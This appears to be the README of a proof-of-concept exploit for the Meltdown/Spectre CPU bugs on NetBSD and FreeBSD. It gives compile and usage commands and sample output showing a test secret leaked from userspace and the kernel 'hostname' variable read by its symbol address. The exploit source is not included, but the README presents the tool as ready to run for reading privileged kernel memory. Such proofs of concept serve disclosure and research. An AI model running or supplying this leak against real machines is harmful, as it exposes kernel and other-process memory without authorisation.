# PoC for meltdown/spectre bugs

To compile:

    akat1@netbsd-dev ~ $ cc -O0 -o fpe fpe.c
 
Usage:

    usage: ./fpe address [len]
    use: ./fpe 0 for test run

For testrun (it leaks data from the userspace):

    akat1@netbsd-dev ~ $ ./fpe 0 | hexdump -C
    00000000  53 73 73 73 68 21 20 49  74 27 73 20 61 20 73 65  |Ssssh! It's a se|
    00000010  63 72 65 74 21 00                                 |cret!.|
    00000016
  
To leak data from the userspace or the kernelspace:

    akat1@netbsd-dev ~ $ nm /netbsd | grep "B hostname$"
    ffffffff815a9fa0 B hostname
    akat1@netbsd-dev ~ $ ./fpe 0xffffffff815a9fa0 10 | hexdump -C
    00000000  6e 65 74 62 73 64 2d 64  65 76                    |netbsd-dev|
    0000000a
    
Please note that leaked data should be in the CPU cache (or not? ;)). More information in the code.

Tested on the FreeBSD and the NetBSD running on top of the Intel(R) Core(TM) i5-2500K CPU.
